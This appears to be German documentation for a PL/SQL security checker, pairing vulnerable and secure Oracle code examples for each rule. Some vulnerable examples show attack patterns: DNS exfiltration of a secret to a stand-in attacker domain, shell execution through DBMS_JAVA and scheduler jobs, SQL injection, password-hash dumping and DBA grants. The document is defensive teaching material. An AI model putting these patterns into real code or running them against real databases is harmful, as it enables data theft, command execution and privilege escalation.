Code-Beispiele (verwundbar / sicher)

Reserviertes Wort als Bezeichner

Ein Bezeichner darf kein reserviertes Wort sein - das führt zu Mehrdeutigkeiten und Fehlern.

Verwundbar
DECLARE
  number  INTEGER;   -- 'NUMBER' ist ein reserviertes Wort
  level   INTEGER;   -- 'LEVEL'  ist ein reserviertes Wort
BEGIN
  number := 1;
END;
/
Sicher
DECLARE
  v_count  INTEGER;
  v_level  INTEGER;
BEGIN
  v_count := 1;
END;
/

Zu langer Bezeichner (> 128 Zeichen)

Bezeichner über der konfigurierten Maximallänge werden gemeldet.

Verwundbar
DECLARE
  -- 146 Zeichen: überschreitet die Oracle-Maximallänge von 128
  v_sehr_langer_bezeichner_der_die_maximale_oracle_identifier_laenge_von_128_zeichen_ab_version_12_2_deutlich_ueberschreitet_und_daher_gemeldet_wird NUMBER;
BEGIN
  v_sehr_langer_bezeichner_der_die_maximale_oracle_identifier_laenge_von_128_zeichen_ab_version_12_2_deutlich_ueberschreitet_und_daher_gemeldet_wird := 0;
END;
/
Sicher
DECLARE
  v_calc_result NUMBER;
BEGIN
  v_calc_result := 0;
END;
/

Code-Beispiele (verwundbar / sicher)

dbms_crypto

Verschlüsselung muss mit einem starken Algorithmus und sauberer Schlüsselverwaltung erfolgen.

Verwundbar
-- Schwacher Algorithmus (DES), Schlüssel im Code hinterlegt
l_key := UTL_RAW.CAST_TO_RAW('mykey123');
l_enc := DBMS_CRYPTO.ENCRYPT(
           src => l_data,
           typ => DBMS_CRYPTO.ENCRYPT_DES
                  + DBMS_CRYPTO.CHAIN_CBC + DBMS_CRYPTO.PAD_PKCS5,
           key => l_key);
Sicher
-- AES-256, Schlüssel aus einem Wallet/Keystore - nicht aus dem Code
l_key := get_key_from_wallet('app_data_key');
l_enc := DBMS_CRYPTO.ENCRYPT(
           src => l_data,
           typ => DBMS_CRYPTO.ENCRYPT_AES256
                  + DBMS_CRYPTO.CHAIN_CBC + DBMS_CRYPTO.PAD_PKCS5,
           key => l_key);

dbms_obfuscation_toolkit

Veraltetes Paket mit schwacher, überholter Verschlüsselung.

Verwundbar
-- Veraltetes Toolkit mit schwachem DES
DBMS_OBFUSCATION_TOOLKIT.DESEncrypt(
  input_string     => l_clear,
  key_string       => l_key,
  encrypted_string => l_enc);
Sicher
-- DBMS_CRYPTO mit AES-256 statt des veralteten Toolkits
l_enc := DBMS_CRYPTO.ENCRYPT(
           src => UTL_I18N.STRING_TO_RAW(l_clear, 'AL32UTF8'),
           typ => DBMS_CRYPTO.ENCRYPT_AES256
                  + DBMS_CRYPTO.CHAIN_CBC + DBMS_CRYPTO.PAD_PKCS5,
           key => l_key);

utl_file

Dateisystemzugriff: Directory-Objekt und Dateiname müssen kontrolliert sein.

Verwundbar
-- Verzeichnis und Dateiname kommen ungeprüft vom Aufrufer
l_fh := UTL_FILE.FOPEN(p_directory, p_filename, 'r');
Sicher
-- Festes, freigegebenes DIRECTORY-Objekt; Dateiname ohne Pfadtrenner
IF INSTR(p_filename, '/') > 0 OR INSTR(p_filename, '\') > 0 THEN
  RAISE_APPLICATION_ERROR(-20001, 'Ungültiger Dateiname');
END IF;
l_fh := UTL_FILE.FOPEN('APP_IMPORT_DIR', p_filename, 'r');

dbms_advisor.create_file

Schreibt einen Puffer in eine Datei im Server-Dateisystem.

Verwundbar
-- Inhalt, Verzeichnis und Dateiname ungeprüft -> beliebige Datei schreibbar
DBMS_ADVISOR.CREATE_FILE(p_content, p_directory, p_filename);
Sicher
-- Festes DIRECTORY, fester Dateiname, kontrollierter Inhalt
DBMS_ADVISOR.CREATE_FILE(l_report_clob, 'APP_REPORT_DIR',
                         'tuning_report.txt');

bfilename

Öffnet eine BFILE-Referenz auf eine Datei im Server-Dateisystem.

Verwundbar
-- Directory-Objektname und Datei aus Benutzereingabe (Pfad-Traversal)
l_bf := BFILENAME(p_dir, p_file);
Sicher
-- Whitelist für das Directory-Objekt; Dateiname ohne Pfadtrenner
IF p_dir NOT IN ('APP_DOCS_DIR', 'APP_IMAGES_DIR')
   OR INSTR(p_file, '/') > 0 OR INSTR(p_file, '\') > 0 THEN
  RAISE_APPLICATION_ERROR(-20002, 'Ungültiger Datei-/Verzeichnisname');
END IF;
l_bf := BFILENAME(p_dir, p_file);

dbms_assert.noop

NOOP prüft nichts - der Wert wird unverändert zurückgegeben.

Verwundbar
-- NOOP deaktiviert die Eingabevalidierung explizit
EXECUTE IMMEDIATE
  'SELECT count(*) FROM ' || DBMS_ASSERT.NOOP(p_table)
  INTO l_cnt;
Sicher
-- Echte Prüfung des Bezeichners
EXECUTE IMMEDIATE
  'SELECT count(*) FROM ' || DBMS_ASSERT.SQL_OBJECT_NAME(p_table)
  INTO l_cnt;

utl_http

Ausgehende HTTP-Verbindung - mögliche SSRF / Datenexfiltration.

Verwundbar
-- Ziel-URL kommt vom Aufrufer
l_resp := UTL_HTTP.REQUEST(p_url);
Sicher
-- Nur freigegebene Endpunkte, feste Basis-URL
IF p_endpoint NOT IN ('orders', 'inventory') THEN
  RAISE_APPLICATION_ERROR(-20003, 'Endpunkt nicht erlaubt');
END IF;
l_resp := UTL_HTTP.REQUEST('https://api.intern.example/' || p_endpoint);

utl_tcp

Rohe TCP-Verbindung aus der Datenbank heraus.

Verwundbar
-- Rohe TCP-Verbindung zu einem aufrufergesteuerten Host
l_conn := UTL_TCP.OPEN_CONNECTION(p_host, p_port);
Sicher
-- Kein roher Socket: definierter Dienst über eine geprüfte API
process_via_approved_service(p_payload);

utl_smtp

E-Mail-Versand - mögliche Datenexfiltration.

Verwundbar
-- Empfänger und Inhalt ungeprüft
UTL_SMTP.RCPT(l_conn, p_to_address);
UTL_SMTP.DATA(l_conn, p_body);
Sicher
-- Versand nur an die freigegebene interne Domäne
IF p_to_address NOT LIKE '%@intern.example' THEN
  RAISE_APPLICATION_ERROR(-20004, 'Empfänger nicht erlaubt');
END IF;
UTL_SMTP.RCPT(l_conn, p_to_address);

utl_inaddr

DNS-Auflösung - klassischer Out-of-Band-Kanal zur Exfiltration.

Verwundbar
-- Geheime Daten in einen DNS-Lookup geschmuggelt
l_x := UTL_INADDR.GET_HOST_ADDRESS(l_secret || '.angreifer.example');
Sicher
-- Keine DNS-Auflösung im Anwendungscode; feste Konfigurationswerte
l_partner_ip := get_config('app_partner_ip');

dbms_sql

Dynamisches SQL - mit Bindevariablen statt Konkatenation aufbauen.

Verwundbar
-- Wert direkt in den SQL-Text konkateniert
l_c := DBMS_SQL.OPEN_CURSOR;
DBMS_SQL.PARSE(l_c,
  'SELECT * FROM orders WHERE id = ' || p_id, DBMS_SQL.NATIVE);
Sicher
-- Platzhalter + BIND_VARIABLE
l_c := DBMS_SQL.OPEN_CURSOR;
DBMS_SQL.PARSE(l_c,
  'SELECT * FROM orders WHERE id = :id', DBMS_SQL.NATIVE);
DBMS_SQL.BIND_VARIABLE(l_c, ':id', p_id);

dbms_java

Java-Ausführung in der DB - mögliche Betriebssystem-Befehlsausführung.

Verwundbar
-- Betriebssystembefehl über Java in der Datenbank
l_out := DBMS_JAVA.RUNJAVA('Shell /bin/sh -c id');
Sicher
-- Keine Java-Ausführung in der DB; Logik in PL/SQL
l_out := compute_in_plsql(p_input);

dbms_scheduler

Kann externe Betriebssystembefehle starten (EXECUTABLE-Jobs).

Verwundbar
-- EXECUTABLE-Job führt einen Betriebssystembefehl aus
DBMS_SCHEDULER.CREATE_JOB(
  job_name   => 'J_EXP',
  job_type   => 'EXECUTABLE',
  job_action => '/bin/sh');
Sicher
-- Nur datenbankinterne PL/SQL-Jobs
DBMS_SCHEDULER.CREATE_JOB(
  job_name   => 'J_CLEANUP',
  job_type   => 'PLSQL_BLOCK',
  job_action => 'BEGIN cleanup_old_rows; END;');

dbms_job

Veraltete, leicht übersehene verzögerte Codeausführung.

Verwundbar
-- Verzögerter PL/SQL-Block, dessen Inhalt vom Aufrufer stammt
DBMS_JOB.SUBMIT(l_job, p_plsql_block, SYSDATE + 1/24);
Sicher
-- DBMS_SCHEDULER mit festem, geprüftem PL/SQL-Block
DBMS_SCHEDULER.CREATE_JOB(
  job_name   => 'J_NIGHTLY',
  job_type   => 'PLSQL_BLOCK',
  job_action => 'BEGIN run_nightly_batch; END;',
  start_date => TRUNC(SYSDATE) + 1 + 1/24);

dbms_sys_sql

Undokumentiert - Ausführung mit fremden Rechten (Privilege Escalation).

Verwundbar
-- SQL mit den Rechten eines anderen Users ausführen
SYS.DBMS_SYS_SQL.PARSE_AS_USER(l_cur, l_sql, DBMS_SQL.NATIVE, 0);
Sicher
-- Definierte AUTHID-Semantik: Prozedur mit AUTHID DEFINER und
-- klar begrenzten Rechten statt DBMS_SYS_SQL
run_with_app_rights(p_action);

dbms_backup_restore

Undokumentiert - Dateisystemzugriff, in Exploits verwendet.

Verwundbar
-- Undokumentiertes Backup-Paket im Anwendungscode
SYS.DBMS_BACKUP_RESTORE.RESTOREVALIDATE(p_handle);
Sicher
-- Backup/Recovery gehört in RMAN-/DBA-Prozesse, nicht in Anwendungscode
NULL;  -- DBMS_BACKUP_RESTORE nicht aus Anwendungscode aufrufen

dbms_jvm_exp_perms

Manipulation von Java-Berechtigungen (Privilege Escalation).

Verwundbar
-- Java-Berechtigungen aus dem Anwendungscode verändern
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(l_perms_cursor);
Sicher
-- Java-Berechtigungen nicht aus Anwendungscode ändern
NULL;  -- DBMS_JVM_EXP_PERMS nicht verwenden

dbms_ldap

LDAP-Zugriff - mögliche SSRF / Datenexfiltration.

Verwundbar
-- LDAP-Server-Adresse kommt vom Aufrufer
l_session := DBMS_LDAP.INIT(p_host, p_port);
Sicher
-- Fester, konfigurierter LDAP-Server
l_session := DBMS_LDAP.INIT('ldap.intern.example', 389);

httpuritype

Netzwerkzugriff - umgeht teils UTL_HTTP-ACLs (SSRF).

Verwundbar
-- URL kommt vom Aufrufer
l_clob := HTTPURITYPE(p_url).GETCLOB();
Sicher
-- Feste, freigegebene URL
l_clob := HTTPURITYPE('https://api.intern.example/status').GETCLOB();

dbms_pipe

Sitzungsübergreifende Kommunikation über DBMS_PIPE.

Verwundbar
-- Sensible Daten über einen aufrufergesteuerten Pipe-Namen
DBMS_PIPE.PACK_MESSAGE(l_secret);
l_st := DBMS_PIPE.SEND_MESSAGE(p_pipe_name);
Sicher
-- Fester, privater Pipe-Name; keine sensiblen Daten übertragen
DBMS_PIPE.PACK_MESSAGE(l_job_id);
l_st := DBMS_PIPE.SEND_MESSAGE('APP_INTERNAL_PIPE');

dbms_lob

LOB-Verarbeitung; BFILE-Zugriff greift auf das Server-Dateisystem zu.

Verwundbar
-- BFILE-Zugriff: Datei aus dem Server-Dateisystem in einen LOB laden
DBMS_LOB.FILEOPEN(l_bfile, DBMS_LOB.FILE_READONLY);
DBMS_LOB.LOADFROMFILE(l_dest, l_bfile, DBMS_LOB.GETLENGTH(l_bfile));
Sicher
-- LOB-Verarbeitung ohne Datei-/BFILE-Zugriff
DBMS_LOB.CREATETEMPORARY(l_tmp, TRUE);
DBMS_LOB.APPEND(l_tmp, l_source_clob);

owa_util

CELLSPRINT u.ä. können zur Informationspreisgabe missbraucht werden.

Verwundbar
-- CELLSPRINT gibt Query-Ergebnisse ungefiltert aus
OWA_UTIL.CELLSPRINT('SELECT username, password_hash FROM app_users');
Sicher
-- Keine generische Tabellenausgabe; gezielte, geprüfte Abfrage
FOR r IN (SELECT username FROM app_users WHERE active = 'Y') LOOP
  HTP.P(r.username);
END LOOP;

Code-Beispiele (verwundbar / sicher)

Gewrappter Code (WRAPPED)

Gewrappter Code lässt sich nicht prüfen und bietet keinen echten Schutz.

Verwundbar
CREATE OR REPLACE PROCEDURE secret_proc WRAPPED
a000000
b2
abcd
... (unleserlicher, gewrappter Rumpf) ...
Sicher
-- Ungewrappter Quelltext - inhaltlich prüfbar
CREATE OR REPLACE PROCEDURE secret_proc AS
BEGIN
  process_data;
END;

CHR()-Kette (CHR-CHAIN)

Lange CHR()-Konkatenationen verbergen Schlüsselworte vor einer Prüfung.

Verwundbar
-- Verschleiertes Schlüsselwort 'SELECT'
l_sql := CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84);
Sicher
-- Klartext - sofort lesbar und prüfbar
l_sql := 'SELECT';

base64-blob

Langer Base64-Block in einem String-Literal - möglicher verschleierter Inhalt.

Verwundbar
-- 60+ Zeichen Base64 direkt im Code
l_payload := 'VG8gZXhlY3V0ZSBhcmJpdHJhcnkgcGF5bG9hZCBmcm9tIHNvdXJjZSBkYXRh';
Sicher
-- Klartext bzw. Wert aus einer geprüften Konfigurationsquelle
l_payload := get_config('report_template');

hex-blob

Langer Hex-Block in einem String-Literal - möglicher verschleierter Inhalt.

Verwundbar
-- 100+ Hex-Zeichen direkt im Code
l_data := '4f6e63652075706f6e20612074696d6520696e2061206'
          || '36f646520726576696577206e6f626f6479206578706563';
Sicher
-- Wert aus einer geprüften Quelle statt eines Hex-Blocks im Code
l_data := get_config('signature_block');

base64-decode-call

Aufruf einer De-/Kodierfunktion - häufig zur Verschleierung von Nutzlasten.

Verwundbar
-- Zur Laufzeit dekodierter Inhalt unbekannter Herkunft
l_raw := UTL_ENCODE.BASE64_DECODE(UTL_RAW.CAST_TO_RAW(p_encoded));
Sicher
-- Eingabe im Klartext annehmen und validieren
validate_input(p_value);
l_raw := UTL_RAW.CAST_TO_RAW(p_value);

dynamic-decode-exec

Sehr kritisch: zur Laufzeit dekodierter Code, der direkt ausgeführt wird.

Verwundbar
-- Dekodierter Inhalt wird unmittelbar als SQL ausgeführt
EXECUTE IMMEDIATE
  UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_DECODE(p_payload));
Sicher
-- Kein dynamischer Code aus dekodierten Daten; statisches SQL
UPDATE orders SET status = l_status WHERE id = p_id;

Code-Beispiele (verwundbar / sicher)

Ungeprüfte Konkatenation (Critical)

Ein Wert wird direkt in den SQL-Text konkateniert - klassische SQL-Injection.

Verwundbar
-- Parameter direkt im SQL-Text
EXECUTE IMMEDIATE
  'SELECT salary FROM emp WHERE ename = ''' || p_name || ''''
  INTO l_sal;
Sicher
-- Bindevariable: der Wert kann den SQL-Text nicht verändern
EXECUTE IMMEDIATE
  'SELECT salary FROM emp WHERE ename = :n'
  INTO l_sal USING p_name;

Unbekannte Herkunft (High)

Der SQL-Text stammt aus einer Variablen, deren Herkunft nicht nachvollziehbar ist.

Verwundbar
-- l_sql wurde z.B. aus einer Tabelle gelesen - Herkunft unklar
EXECUTE IMMEDIATE l_sql;
Sicher
-- Statisches SQL mit Bindevariablen statt eines fremden SQL-Texts
EXECUTE IMMEDIATE
  'UPDATE emp SET salary = :s WHERE empno = :e'
  USING p_salary, p_empno;

Bezeichner im dynamischen SQL (abgesichert)

Tabellen-/Spaltennamen lassen sich nicht binden - sie müssen geprüft werden.

Verwundbar
-- Tabellenname ungeprüft konkateniert
EXECUTE IMMEDIATE 'SELECT count(*) FROM ' || p_table INTO l_cnt;
Sicher
-- Bezeichner über DBMS_ASSERT prüfen
EXECUTE IMMEDIATE
  'SELECT count(*) FROM ' || DBMS_ASSERT.SQL_OBJECT_NAME(p_table)
  INTO l_cnt;

Code-Beispiele (verwundbar / sicher)

Grundregel: kein DDL zur Laufzeit im Anwendungscode. Notwendige Objekte und Rechte werden einmalig über ein geprüftes Deployment-Skript angelegt; der Anwendungscode arbeitet nur mit DML.

GRANT

Rechtevergabe zur Laufzeit kann zu Rechteausweitung führen.

Verwundbar
-- Rechtevergabe zur Laufzeit, Empfänger aus Eingabe
EXECUTE IMMEDIATE 'GRANT SELECT ON salaries TO ' || p_user;
Sicher
-- Kein GRANT im Code; die Rolle wurde einmalig beim Deployment vergeben.
-- Anwendungscode nutzt nur DML:
SELECT salary INTO l_sal FROM salaries WHERE empno = p_empno;

REVOKE

Rechteentzug zur Laufzeit kann Anwendungen unbemerkt brechen.

Verwundbar
EXECUTE IMMEDIATE 'REVOKE SELECT ON reports FROM ' || p_role;
Sicher
-- Rechtepflege ausschließlich über kontrollierte DBA-Skripte;
-- der Anwendungscode entzieht keine Rechte.
process_report(p_report_id);

CREATE

Objekterzeugung zur Laufzeit (z.B. CREATE DATABASE LINK, CREATE DIRECTORY).

Verwundbar
-- DB-Link mit Zugangsdaten zur Laufzeit erzeugen
EXECUTE IMMEDIATE
  'CREATE DATABASE LINK lk CONNECT TO u IDENTIFIED BY '
  || p_pwd || ' USING ''remote''';
Sicher
-- Objekte einmalig im Deployment anlegen; Code nutzt sie nur
INSERT INTO import_log(file_name, loaded_at)
  VALUES (p_file, SYSTIMESTAMP);

ALTER

Änderung von Objekt, Sitzung oder System zur Laufzeit (ALTER SYSTEM/SESSION sensibel).

Verwundbar
-- Sitzungseinstellung zur Laufzeit umschalten
EXECUTE IMMEDIATE 'ALTER SESSION SET sql_trace = TRUE';
Sicher
-- Verhalten über geprüfte Konfigurationswerte steuern, nicht über ALTER
l_trace_on := get_config('trace_enabled');

DROP

Löschen eines Datenbankobjekts zur Laufzeit.

Verwundbar
-- Objekt zur Laufzeit löschen, Name aus Eingabe
EXECUTE IMMEDIATE 'DROP TABLE ' || p_table_name;
Sicher
-- Daten statt Objekte löschen; mit WHERE und Bindevariable
DELETE FROM staging_rows WHERE batch_id = p_batch_id;

TRUNCATE

TRUNCATE ist nicht zurückrollbar.

Verwundbar
-- Nicht zurückrollbares Leeren einer Tabelle zur Laufzeit
EXECUTE IMMEDIATE 'TRUNCATE TABLE ' || p_table_name;
Sicher
-- Gezieltes, transaktionssicheres Löschen
DELETE FROM staging_rows WHERE batch_id = p_batch_id;
COMMIT;

RENAME

Umbenennung eines Objekts zur Laufzeit.

Verwundbar
EXECUTE IMMEDIATE 'RENAME ' || p_old || ' TO ' || p_new;
Sicher
-- Keine Objektumbenennung zur Laufzeit; Schemaänderungen nur
-- im geprüften Deployment-Skript.
log_event('rename requested', p_old);

ALTER USER (kritisches Statement)

Benutzer-/Passwortverwaltung gehört nicht in CI/CD-Deployment-Skripte.

Verwundbar
-- Datenbankbenutzer aus dem Anwendungscode ändern
EXECUTE IMMEDIATE
  'ALTER USER ' || p_user || ' IDENTIFIED BY ' || p_new_pwd;
Sicher
-- Benutzer-/Passwortverwaltung über den IAM-/DBA-Prozess.
-- Der Anwendungscode pflegt nur das fachliche Profil:
update_app_profile(p_user_id, p_settings);

Externe Tabelle (ORGANIZATION EXTERNAL)

Externe Tabellen lesen über ein DIRECTORY-Objekt aus dem Server-Dateisystem.

Verwundbar
-- Externe Tabelle greift auf eine Datei im Server-Dateisystem zu
CREATE TABLE ext_import (line VARCHAR2(4000))
ORGANIZATION EXTERNAL (
  TYPE ORACLE_LOADER
  DEFAULT DIRECTORY app_any_dir
  LOCATION ('import.csv'));
Sicher
-- Heap-Tabelle; Befüllung über einen kontrollierten Ladeprozess
-- (geprüftes ETL / SQL*Loader) statt direktem Dateizugriff der DB.
CREATE TABLE staged_import (line VARCHAR2(4000));

GRANT/REVOKE von Systemprivileg / Standardrolle

Systemprivilegien und Standardrollen dürfen nicht über CI/CD-Skripte vergeben werden.

Verwundbar
-- Systemprivileg bzw. Standardrolle vergeben
GRANT CREATE ANY TABLE TO app_user;
GRANT DBA TO app_user;
Sicher
-- Nur ein minimales Objektprivileg, das die Anwendung wirklich braucht
GRANT SELECT ON app.orders TO app_read_role;
